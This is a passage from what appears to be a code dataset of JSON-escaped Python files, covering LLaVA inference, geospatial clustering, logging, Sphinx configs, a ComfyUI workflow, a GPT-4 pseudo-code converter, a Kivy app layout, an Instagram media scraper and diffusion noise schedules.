input_ids.shape[1]:]).strip()\n    conv.messages[-1][-1] = outputs\n    \n    if args.debug:\n        log = {\"prompt\": prompt, \"outputs\": outputs}\n        print(\"\\n\", log, \"\\n\")\n    \n    return conv.dict()\n\ndef main(args):\n    # output dir\n    if args.output_dir is not None:\n        os.makedirs(args.output_dir, exist_ok=True)\n        output_path = os.path.join(args.output_dir, 'log.json')\n\n    # Model\n    disable_torch_init()\n\n    # set up model\n    if args.model_name is None:\n        model_name = get_model_name_from_path(args.model_path)\n    else:\n        model_name = args.model_name\n    tokenizer, model, image_processor, context_len = load_pretrained_model(\n        args.model_path, \n        args.model_base, \n        model_name, \n        args.load_8bit, \n        args.load_4bit, \n        device=args.device\n    )\n    print(\"model loaded:\", model_name)\n\n    # set up conversation\n    if 'llama-2' in model_name.lower():\n        conv_mode = \"llava_llama_2\"\n    elif \"v1\" in model_name.lower():\n        conv_mode = \"llava_v1\"\n    elif \"mpt\" in model_name.lower():\n        conv_mode = \"mpt\"\n    else:\n        conv_mode = \"vicuna_v1\"\n\n    if args.conv_mode is not None and conv_mode != args.conv_mode:\n        print('[WARNING] the auto inferred conversation mode is {}, while `--conv-mode` is {}, using {}'.format(conv_mode, args.conv_mode, args.conv_mode))\n    else:\n        args.conv_mode = conv_mode\n\n    # do inference\n    all_logs = {\n        \"configs\": copy.deepcopy(args.__dict__),\n        \"responses\":[]\n    }\n    if args.run_task is not None:\n        task_data = get_task_data(args.run_task, args.dataset_name, prompt_version=args.version)\n        if args.k > 0:\n            print(f\"take the first {args.k} instances\")\n            task_data[\"images\"] = task_data[\"images\"][:args.k]\n            task_data[\"prompts\"] = task_data[\"prompts\"][:args.k]\n            task",
    "import numpy as np\r\nimport warnings\r\nimport random\r\nimport geopandas as gpd\r\nimport matplotlib.pyplot as plt\r\nfrom scipy.ndimage import maximum_filter\r\n\r\ndef extract_hotspots(density_data_path, window_size=10, threshold=0):\r\n    \"\"\"\r\n    Extract hotspots from density data using a window analysis approach.\r\n\r\n    Parameters:\r\n        density_data_path (str): Path to the .npy file containing density data.\r\n        window_size (int): Size of the window for maximum filter (default is 10).\r\n        threshold (int): Threshold value for extreme regions (default is 0).\r\n\r\n    Returns:\r\n        hotspots (ndarray): Array containing coordinates of hotspots.\r\n    \"\"\"\r\n    # Load density data from the saved .npy file\r\n    density_data = np.load(density_data_path)\r\n\r\n    # Step 1: Window analysis to get maximum values within each window\r\n    max_density_surface = maximum_filter(density_data, size=window_size)\r\n\r\n    # Step 2: Algebraic subtraction to get non-negative surface\r\n    non_negative_surface = max_density_surface - density_data\r\n\r\n    # Step 3: Reclassification algorithm to classify into extreme and non-extreme regions\r\n    extreme_region = non_negative_surface == threshold\r\n\r\n    # Step 4: Extract hotspots from extreme regions\r\n    hotspots = np.argwhere(extreme_region)\r\n\r\n    return hotspots\r\n\r\ndef visualize_hotspots(density_data, hotspots):\r\n    \"\"\"\r\n    Visualize hotspots on the density data.\r\n\r\n    Parameters:\r\n        density_data (ndarray): Density data array.\r\n        hotspots (ndarray): Array containing coordinates of hotspots.\r\n    \"\"\"\r\n    plt.figure(figsize=(8, 6))\r\n    plt.imshow(density_data, cmap='Purples', origin='lower')\r\n    plt.colorbar(label='Density')\r\n    plt.scatter(hotspots[:, 1], hotspots[:, 0], color='red', s=5, label='Hotspots')\r\n    plt.xlabel('X')\r\n    plt.ylabel('Y')\r\n    plt.title('Hotspot Extraction')\r\n    plt.legend()\r\n    plt.show()\r\n\r\n\r\ndef km_euclidean_distance(x1, x2):\r\n    \"\"\"Calculate the Euclidean distance between two points for K-Means.\"\"\"\r\n    return np.sqrt(np.sum((x1 - x2)**2))\r\n\r\ndef km_initialize_centroids(X, n_clusters, random_state=None):\r\n    \"\"\"Initialize centroids for K-Means clustering.\"\"\"\r\n    np.random.seed(random_state)\r\n    centroids_indices = np.random.choice(X.shape[0], size=n_clusters, replace=False)\r\n    centroids = X[centroids_indices]\r\n    return centroids\r\n\r\ndef km_assign_clusters(X, centroids):\r\n    \"\"\"Assign clusters to points based on current centroids for K-Means.\"\"\"\r\n    clusters = []\r\n    for x in X:\r\n        distances = [km_euclidean_distance(x, centroid) for centroid in centroids]\r\n        cluster = np.argmin(distances)\r\n        clusters.append(cluster)\r\n    return np.array(clusters)\r\n\r\ndef km_update_centroids(X, clusters, n_clusters):\r\n    \"\"\"Update centroids based on current cluster assignments for K-Means.\"\"\"\r\n    centroids = np.zeros((n_clusters, X.shape[1]))\r\n    for cluster in range(n_clusters):\r\n        cluster_points = X[clusters == cluster]\r\n        if len(cluster_points) > 0:\r\n            centroids[cluster] = np.mean(cluster_points, axis=0)\r\n    return centroids\r\n\r\ndef km_plot_clusters(X, clusters, centroids):\r\n    \"\"\"Plot clusters and centroids for K-Means.\"\"\"\r\n    plt.figure(figsize=(8, 6))\r\n    plt.scatter(X[:, 0], X[:, 1], c=clusters, cmap='viridis', s=50, edgecolor='k')\r\n    plt.scatter(centroids[:, 0], centroids[:, 1], marker='*', c='red', s=150, edgecolor='k')\r\n    plt.xlabel('Longitude')\r\n    plt.ylabel('Latitude')\r\n    plt.title('Clusters and Centroids (K-Means)')\r\n    plt.colorbar(label='Cluster')\r\n    plt.grid(True)\r\n    plt.show()\r\n\r\ndef km_kmeans_clustering(shp_file_path, n_clusters=3, max_iterations=100, visualize=True, random_state=None):\r\n    \"\"\"Perform K-Means clustering on point data from an SHP file.\"\"\"\r\n    # Suppress warnings for demonstration purposes\r\n    warnings.filterwarnings(\"ignore\")\r\n\r\n    # Load the SHP file into a GeoDataFrame\r\n    gdf = gpd.read_file(shp_file_path)\r\n\r\n    # Extract features (coordinates) from the GeoDataFrame\r\n    X = np.column_stack((gdf['geometry'].x, gdf['geometry'].y))\r\n\r\n    # Initialize centroids\r\n    centroids = km_initialize_centroids(X, n_clusters, random_state=random_state)\r\n\r\n    # Perform K-Means iterations\r\n    for _ in range(max_iterations):\r\n        # Assign clusters to points\r\n        clusters = km_assign_clusters(X, centroids)\r\n        # Update centroids\r\n        new_centroids = km_update_centroids(X, clusters, n_clusters)\r\n        # Check for convergence\r\n        if np.allclose(new_centroids, centroids):\r\n            break\r\n        centroids = new_centroids\r\n\r\n    if visualize:\r\n        # Visualize the clusters and centroids\r\n        km_plot_clusters(X, clusters, centroids)\r\n\r\n    return clusters, centroids\r\n\r\ndef db_range_query(X, point, eps):\r\n    \"\"\"Find neighboring points within a specified distance for DBSCAN.\"\"\"\r\n    neighbors = []\r\n    for i, x in enumerate(X):\r\n        if km_euclidean_distance(point, x) <= eps:\r\n            neighbors.append(i)\r\n    return nei",
    "import logging\n\nclass LogManagement:\n    def __init__(self, nome):\n        self.formato = logging.Formatter('%(asctime)s | %(levelname)s | %(name)s : %(message)s', datefmt='%d/%m/%y %H:%M:%S')\n        self.logger = logging.getLogger(nome)\n        self.logger.setLevel(logging.INFO)\n\n        terminal = logging.StreamHandler()\n        terminal.setFormatter(self.formato)\n        self.logger.addHandler(terminal)\n\n        arquivo = logging.FileHandler(\"Registros.log\")\n        arquivo.setLevel(logging.INFO)\n        arquivo.setFormatter(self.formato)\n        self.logger.addHandler(arquivo)\n    \n    def info(self, msg):\n        self.logger.info(msg)\n    \n    def warning(self, msg):\n        self.logger.warning(msg)\n    \n    def error(self, msg):\n        self.logger.error(msg)\n    \n    def critical(self, msg):\n        self.logger.critical(msg)\n\nif __name__ == \"__main__\":\n    mgnt = LogManagement(__file__)\n    mgnt.info(\"Apenas um registro mesmo\")\n    mgnt.warning(\"Cuidado que pode ter um erro ein\")\n    mgnt.error(\"Vish deu um erro Grave cara\")\n    mgnt.critical(\"Deu MERDA\")",
    "# Configuration file for the Sphinx documentation builder.\n#\n# For the full list of built-in configuration values, see the documentation:\n# https://www.sphinx-doc.org/en/master/usage/configuration.html\n\n# -- Project information -----------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#project-information\n\nimport os\nimport sys\nsys.path.insert(0, os.path.abspath('../pygem/'))\n\nproject = 'pygem'\ncopyright = '2023, David Rounce'\nauthor = 'David Rounce'\nrelease = '0.2.5'\n\n# -- General configuration ---------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#general-configuration\n\nextensions = ['sphinx_book_theme',\n              'myst_parser',\n              'sphinx.ext.autodoc',\n              'sphinx.ext.autosummary',\n              'sphinx.ext.intersphinx',\n              'numpydoc',\n              'sphinx.ext.viewcode',\n              'sphinx_togglebutton',\n              ]\n\nmyst_enable_extensions = [\n    \"amsmath\",\n    \"attrs_inline\",\n    \"colon_fence\",\n    \"deflist\",\n    \"dollarmath\",\n    \"fieldlist\",\n    \"html_admonition\",\n    \"html_image\",\n#    \"linkify\",\n#    \"replacements\",\n#    \"smartquotes\",\n#    \"strikethrough\",\n#    \"substitution\",\n#    \"tasklist\",\n]\n\n#templates_path = ['_templates']\nexclude_patterns = ['_build', 'Thumbs.db', '.DS_Store']\n\n\n\n# -- Options for HTML output -------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#options-for-html-output\n\n\nhtml_theme = 'sphinx_book_theme'\nhtml_static_path = ['_static']\n\nhtml_theme_options = {\n    \"repository_url\": \"https://github.com/drounce/PyGEM\",\n    \"use_repository_button\": True,\n    \"show_nav_level\":2,\n    \n    \"max_depth\":3,\n    \"navigation_depth\":3,\n#    \"show_toc_level\":2,\n#    'collapse_navigation': True,\n#    'sticky_navigation': True,\n#    'navigation_depth': 4,\n#    \"use_issues_button\": True,\n#    \"use_edit_page_button\": True,\n#    \"path_to_docs\": \"docs\",\n#    # \"home_page_in_toc\": True,\n#    \"toc_title\": 'On this page',\n    }",
    "from typing import Annotated\n\nfrom ..blender_utils import pil_to_image\nfrom ..comfy_script.runtime.nodes import *\nfrom ..io_utils.image import ImageDataETNLoadImageBase64\nfrom ..workflow import WorkFlowObject\nfrom ..workflow_types import ComboWidget, FloatCFGType, FloatPercentageType, ImageType, IntSeedType, IntStepsType\n\n\nclass WorkFlow(WorkFlowObject):\n    def execute(\n        self,\n        checkpoint: Annotated[str, ComboWidget(choices=[e.value for e in CheckpointLoaderSimple.ckpt_name])],\n        positive: str = \"1girl\",\n        negative: str = \"text, watermark\",\n        control_net_hint: ImageType = None,\n        control_net: Annotated[str, ComboWidget(choices=[e.value for e in ControlNetLoader.control_net_name])] = None,\n        control_net_strength: FloatPercentageType = 1,\n        width: int = 512,\n        height: int = 512,\n        batch_size: int = 1,\n        steps: IntStepsType = 20,\n        cfg: FloatCFGType = 5,\n        seed: IntSeedType = 0,\n        sampler_name: Annotated[str, ComboWidget(choices=[e.value for e in KSampler.sampler_name])] = None,\n        scheduler: Annotated[str, ComboWidget(choices=[e.value for e in KSampler.scheduler])] = None,\n    ):\n        image_data = open(control_net_hint, \"rb\").read()\n        control_net_hint_node = ImageDataETNLoadImageBase64(image_data)\n\n        model, clip, vae = CheckpointLoaderSimple(checkpoint)\n        conditioning = CLIPTextEncode(positive, clip)\n        control_net_model = ControlNetLoader(control_net)\n        image, _ = control_net_hint_node.comfy_script_load()\n        conditioning = ControlNetApply(conditioning, control_net_model, image, control_net_strength)\n        conditioning2 = CLIPTextEncode(negative, clip)\n        latent = EmptyLatentImage(width, height, batch_size)\n        latent = KSampler(model, seed, steps, cfg, sampler_name, scheduler, conditioning, conditioning2, latent, 1)\n        image3 = VAEDecode(latent, vae)\n        return (PreviewImage(image3),)\n\n    def post_execute(self, results):\n        out_images = results[0].wait()\n        for i, out_image in enumerate(out_images):\n            bpy_image = pil_to_image(out_image, f\"control_net_output_{i}\")\n",
    "import os\nimport sys\nimport openai\nfrom pyparsing import QuotedString\nimport platform\n\ndef get_api_key_path():\n    if platform.system() == 'Windows':\n        api_key_path = os.path.join(os.getenv('APPDATA'), '.apikey')\n    elif platform.system() == 'Darwin':\n        api_key_path = os.path.expanduser('~/.apikey')\n    else:\n        api_key_path = os.path.expanduser('~/.apikey')\n    return api_key_path\n\ndef load_api_key(api_key_path):\n    with open(api_key_path, 'r') as file:\n        api_key = file.read().strip()\n    return api_key\n\ndef save_api_key(api_key, api_key_path):\n    with open(api_key_path, 'w') as file:\n        file.write(api_key)\n\ndef process_lpy_file(file_path):\n    with open(file_path, 'r') as file:\n        content = file.read()\n        \n    print(\"reached\")\n\n    csm_snippets = QuotedString('`', multiline=True).setParseAction(lambda t: t[0][1:-1]).searchString(content)\n\n    for snippet in csm_snippets:\n        if '[csm]' in snippet:\n            code_snippet = snippet.split('[csm]')[1].strip()\n            print(f\"Processing code snippet: {code_snippet}\")\n            converted_code = convert_with_chatgpt(code_snippet)\n            content = content.replace(f'`{snippet}`', converted_code)\n\n    py_file_path = file_path.replace('.lpy', '.py')\n    \n    if os.path.exists(py_file_path):\n        os.remove(py_file_path)\n    \n    with open(py_file_path, 'w') as file:\n        file.write(content)\n\n    while True:\n        try:\n            compile(content, py_file_path, 'exec')\n            print(f\"Successfully compiled: {py_file_path}\")\n            break\n        except SyntaxError as e:\n            print(f\"Compilation error: {str(e)}\")\n            corrected_code = correct_with_chatgpt(content, str(e))\n            content = corrected_code\n            with open(py_file_path, 'w') as file:\n                file.write(content)\n\ndef convert_with_chatgpt(code_snippet):\n    prompt = f\"Please convert the following description / pseudo-code into valid Python:\\n\\n```{code_snippet}```\\n\\nProvide only the converted Python code in your response, without any explanations. Do not include the original description / pseudo-code in your response. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n    print(response.choices[0].message)\n\n    converted_code = response.choices[0].message.content.strip()\n    return converted_code\n\ndef correct_with_chatgpt(code, error_message):\n    prompt = f\"The following Python code has a compilation error:\\n\\n```{code}```\\n\\nError message: {error_message}\\n\\nPlease correct the code and provide only the corrected Python code in your response, without any explanations. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n\n    corrected_code = response.choices[0].message.content.strip()\n    return corrected_code\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print(\"Please provide the path to the .lpy file as a command-line argument.\")\n        sys.exit(1)\n\n    lpy_file_path = sys.argv[1]\n\n    api_key_path = get_api_key_path()\n\n    if '-a' in sys.argv:\n        api_key_index = sys.argv.index('-a') + 1\n        if api_key_index < len(sys.argv):\n            api_key = sys.argv[api_key_index]\n            save_api_key(api_key, api_key_path)\n        else:\n            print(\"Please provide an API key after the -a flag.\")\n            sys.exit(1)\n    else:\n        try:\n            api_key = load_api_key(api_key_path)\n        except FileNotFoundError:\n            print(f\"API key file not found at {api_key_path}. Please provide an API key using the -a flag.\")\n            sys.exit(1)\n\n    openai.api_key = api_key\n\n    process_lpy_file(lpy_file_path)",
    "from kivymd.app import MDApp\nfrom kivy.lang.builder import Builder\nfrom kivy.uix.screenmanager import ScreenManager, Screen\nfrom kivy_garden.mapview import MapView\nfrom kivy.core.window import Window\n\nWindow.size = (360,800)\n\nscreen_helper = \"\"\"\n\nScreenManager:\n    MenuScreen:\n    TempleScreen:\n    OmkarScreen:\n    BhagScreen:\n    TalaScreen:\n    PadiScreen:\n    GoldScreen:\n    MruScreen:\n    WaterScreen:\n    AbbScreen:\n    IruScreen:\n    MalScreen:\n    CheScreen:\n    NapScreen:\n    DevScreen:\n    FueScreen:\n    FoodScreen:\n    GrowScreen:\n    WineScreen:\n    RentScreen:\n    MapScreen:\n    HospScreen:\n\n\n<MenuScreen>:\n    name: 'menu'\n    MDIconButton:\n        icon: 'nut'\n        pos_hint:{'center_x' :0.9, 'center_y' :0.96}\n        theme_text_color: 'Custom'\n        text_color: app.theme_cls.accent_color\n        text_color: 0,0,0,1 \n    Image:\n        source: \"back.jpg\"\n        allow_stretch: True\n        keep_ratio: False\n        pos_hint: {'center_x' :0.5, 'center_y' :0.5}\n    Image:\n        source: \"logo.png\"\n        size_hint: 0.55,0.55\n        pos_hint: {'center_x' :0.5, 'center_y' :0.87}\n    ScrollView:\n        do_scroll_x: True\n        pos_hint: {'center_x':0.48,'center_y':0.73}\n        size_hint: 1,0.1\n        BoxLayout:\n            orientation: 'horizontal'\n            size_hint_x: None\n            width: 2150\n            padding: \"20dp\"\n            spacing: \"40dp\"\n            MDIconButton:\n                on_press: root.manager.current = 'fue'\n                Image:\n                    source: \"gas.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'food'\n                Image:\n                    source: \"food.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'grow'\n                Image:\n                    source: \"grocery.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'wine'\n                Image:\n                    source: \"wine.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'rent'\n                Image:\n                    source: \"rent.png\"\n                    size_hint: 2.3,2.3\n            MDIconButton:\n                on_press: root.manager.current = 'hosp'\n                Image:\n                    source: \"medi.png\"\n                    size_hint: 2.3,2.3\n            MDRectangleFlatButton:\n                text: 'Bamboo Shoot'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 143/255,177/255,236/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Noolputtu'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 230/255,155/255,253/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Curd Rice'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 236/255,171/255,143/255\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n            MDRectangleFlatButton:\n                text: 'Jackfruit'\n                pos_hint: {'center_x' :0.7, 'center_y' :0.83}\n                halign:'center'\n                md_bg_color: 143/255,177/255,236/255,1\n                theme_text_color: \"Custom\"\n                text_color: 0,0,0,1\n                font_style : 'Button'\n                font_size: \"15sp\"\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.26,'center_y':0.57}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        on_press: root.manager.current = 'temple'\n        Image:\n            source: \"temple.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.74,'center_y':0.57}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        on_press: root.manager.current = 'water'\n        Image:\n            source: \"water.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.26,'center_y':0.36}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        Image:\n            source: \"mountain.png\"\n            size_hint: 1.3,1.3\n    MDRectangleFlatButton:\n        pos_hint: {'center_x':0.74,'center_y':0.36}\n        size_hint: 0.4,0.16\n        md_bg_color: 159/255,0/255,255/255,1\n        Image:\n            source: \"resort.png\"\n            size_hint: 1.3,1.3\n    ",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.maximize_window()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\n\r\nusername.send_keys(\"xxxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\nname_search = \"xxxxxxxxxxxx\" # Write Username Of Account\r\n\r\nurl = f\"https://www.instagram.com/{name_search}/\"\r\n\r\ntime.sleep(3)\r\ndriver.get(url)\r\ntime.sleep(10)\r\n\r\n\r\n#scroll\r\nscrolldown=driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\nmatch=False\r\nposts = []\r\nwhile(match==False):\r\n    last_count = scrolldown\r\n    time.sleep(3)\r\n    scrolldown = driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\n\r\n    links = driver.find_elements(By.TAG_NAME, \"a\")\r\n    for link in links:\r\n        try:\r\n            post = link.get_attribute('href')\r\n        except:\r\n            continue\r\n        if post not in posts:\r\n            if '/p/' in post:\r\n                posts.append(post)\r\n\r\n\r\n    if last_count==scrolldown:\r\n        match=True\r\n\r\n\r\nimgs_link = []\r\nnumber = 1\r\n\r\n#get videos and images\r\ndownload_url = ''\r\nfor post in posts:\r\n    driver.get(post)\r\n    shortcode = driver.current_url.split('/')[-2]\r\n    num = 1\r\n    time.sleep(3)\r\n\r\n    main_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\n    while True:\r\n        imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n        for img in imgs:\r\n            link = img.get_attribute('src')\r\n            if link not in imgs_link:\r\n                urllib.request.urlretrieve(link, f'img_{number}{shortcode}{num}.jpg')\r\n                num += 1\r\n                imgs_link.append(link)\r\n\r\n                time.sleep(5)\r\n\r\n        try:\r\n            driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n            time.sleep(3)\r\n        except:\r\n            number += 1\r\n            break\r\n",
    "# -*- coding: utf-8 -*-\n#\n# Configuration file for the Sphinx documentation builder.\n#\n# This file does only contain a selection of the most common options. For a\n# full list see the documentation:\n# http://www.sphinx-doc.org/en/master/config\n\n# -- Path setup --------------------------------------------------------------\n\n# If extensions (or modules to document with autodoc) are in another directory,\n# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\n#\n# import os\n# import sys\n# sys.path.insert(0, os.path.abspath('.'))\nimport os, sys\n\n# sys.path.insert(0, os.path.abspath('..'))\n# sys.path.insert(0, os.path.abspath(\"../src/\"))\n# sys.path.insert(0, os.path.abspath('../src/modlee'))\nsys.path.insert(0, os.path.abspath('../../src/modlee'))\n\n# -- Project information -----------------------------------------------------\n\nproject = \"modlee\"\ncopyright = \"2024, Modlee, Inc\"\nauthor = \"modlee\"\n\n# The short X.Y version\nversion = \"\"\n# The full version, including alpha/beta/rc tags\nrelease = \"0\"\n\n\n# -- General configuration ---------------------------------------------------\n\n# If your documentation needs a minimal Sphinx version, state it here.\n#\n# needs_sphinx = '1.0'\n\n# Add any Sphinx extension module names here, as strings. They can be\n# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom\n# ones.\nextensions = [\n    \"sphinx.ext.autodoc\",\n    # \"sphinx.ext.autosummary\",\n    \"sphinx.ext.doctest\",\n    \"sphinx.ext.intersphinx\",\n    \"sphinx.ext.todo\",\n    \"sphinx.ext.coverage\",\n    \"sphinx.ext.mathjax\",\n    \"sphinx.ext.ifconfig\",\n    \"sphinx.ext.viewcode\",\n    \"sphinx.ext.githubpages\",\n    \"sphinx.ext.autosectionlabel\",\n    \"nbsphinx\",\n]\n# autosummary_generate = True\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = [\"_templates\"]\n\n# The suffix(es) of source filenames.\n# You can specify multiple suffix as a list of string:\n#\n# source_suffix = ['.rst', '.md']\nsource_suffix = \".rst\"\n\n# The master toctree document.\nmaster_doc = \"index\"\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#\n# This is also used if you do content translation via gettext catalogs.\n# Usually you set \"language\" from the command line for these cases.\nlanguage = None\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\n# This pattern also affects html_static_path and html_extra_path.\nexclude_patterns = []\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = None\n\n\n# -- Options for HTML output ----------------;;---------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#\n# html_theme = 'alabaster'\n# html_style = 'css/custom.css'\nhtml_theme = \"sphinx_rtd_theme\"\n\n# Favicon\nhtml_favicon = \"modlee.ico\"\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#\nhtml_theme_options = {\n    'github_url':'https://github.com/modlee-ai/modlee',\n    # \"show_navbar_depth\": 3,\n    \"collapse_navigation\": False,\n}\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = [\"_static\"]\nhtml_css_files = ['css/custom.css']\n\n# Custom sidebar templates, must be a dictionary that maps document names\n# to template names.\n#\n# The default sidebars (for documents that don't match any pattern) are\n# defined by theme itself.  Builtin themes are using these templates by\n# default: ``['localtoc.html', 'relations.html', 'sourcelink.html',\n# 'searchbox.html']``.\n#\n# html_sidebars = {}\n# html_sidebars = { '**': ['globaltoc.html', 'relations.html', 'sourcelink.html', 'searchbox.html'] }\nhtml_sidebars = { '**': ['localtoc.html', 'relations.html', 'sourcelink.html', 'searchbox.html'] }\n\n\n\n# -- Options for HTMLHelp output ---------------------------------------------\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = \"modleedoc\"\n\n\n# -- Options for LaTeX output ------------------------------------------------\n\nlatex_elements = {\n    # The paper size ('letterpaper' or 'a4paper').\n    #\n    # 'papersize': 'letterpaper',\n    # The font size ('10pt', '11pt' or '12pt').\n    #\n    # 'pointsize': '10pt',\n    # Additional stuff for the LaTeX preamble.\n    #\n    # 'preamble': '',\n    # Latex figure (float) alignment\n    #\n    # 'figure_align': 'htbp',\n}\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title,\n#  author, documentclass [howto, manual, or own class]).\nlatex_documents = [\n    (master_doc, \"modlee.tex\", \"modlee Documentation\", \"modlee",
    "import math\r\n\r\nfrom scipy import integrate\r\nimport torch\r\nfrom torch import nn\r\nfrom torchdiffeq import odeint\r\nimport torchsde\r\nfrom tqdm.auto import trange, tqdm\r\n\r\nfrom . import utils\r\n\r\n\r\n\r\ndef append_zero(x):\r\n    return torch.cat([x, x.new_zeros([1])])\r\n\r\n\r\ndef get_sigmas_karras(n, sigma_min, sigma_max, rho=7., device='cpu'):\r\n    \"\"\"Constructs the noise schedule of Karras et al. (2022).\"\"\"\r\n    ramp = torch.linspace(0, 1, n)\r\n    min_inv_rho = sigma_min ** (1 / rho)\r\n    max_inv_rho = sigma_max ** (1 / rho)\r\n    sigmas = (max_inv_rho + ramp * (min_inv_rho - max_inv_rho)) ** rho\r\n    return append_zero(sigmas).to(device)\r\n\r\n\r\ndef get_sigmas_exponential(n, sigma_min, sigma_max, device='cpu'):\r\n    \"\"\"Constructs an exponential noise schedule.\"\"\"\r\n    sigmas = torch.linspace(math.log(sigma_max), math.log(sigma_min), n, device=device).exp()\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef get_sigmas_polyexponential(n, sigma_min, sigma_max, rho=1., device='cpu'):\r\n    \"\"\"Constructs an polynomial in log sigma noise schedule.\"\"\"\r\n    ramp = torch.linspace(1, 0, n, device=device) ** rho\r\n    sigmas = torch.exp(ramp * (math.log(sigma_max) - math.log(sigma_min)) + math.log(sigma_min))\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef get_sigmas_vp(n, beta_d=19.9, beta_min=0.1, eps_s=1e-3, device='cpu'):\r\n    \"\"\"Constructs a continuous VP noise schedule.\"\"\"\r\n    t = torch.linspace(1, eps_s, n, device=device)\r\n    sigmas = torch.sqrt(torch.exp(beta_d * t ** 2 / 2 + beta_min * t) - 1)\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef to_d(x, sigma, denoised):\r\n    \"\"\"Converts a denoiser output to a Karras ODE derivative.\"\"\"\r\n    return (x - denoised) / utils.append_dims(sigma, x.ndim)\r\n\r\n\r\ndef get_ancestral_step(sigma_from, sigma_to, eta=1.):\r\n    \"\"\"Calculates the noise level (sigma_down) to step down to and the amount\r\n    of noise to add (sigma_up) when doing an ancestral sampling step.\"\"\"\r\n    if not eta:\r\n        return sigma_to, 0.\r\n    sigma_up = min(sigma_to, eta * (sigma_to ** 2 * (sigma_from ** 2 - sigma_to ** 2) / sigma_from ** 2) ** 0.5)\r\n    # eta = 0\u65f6\uff0csigma_up == 0,\r\n    sigma_down = (sigma_to ** 2 - sigma_up ** 2) ** 0.5\r\n    return sigma_down, sigma_up\r\n\r\n\r\ndef default_noise_sampler(x):\r\n    return lambda 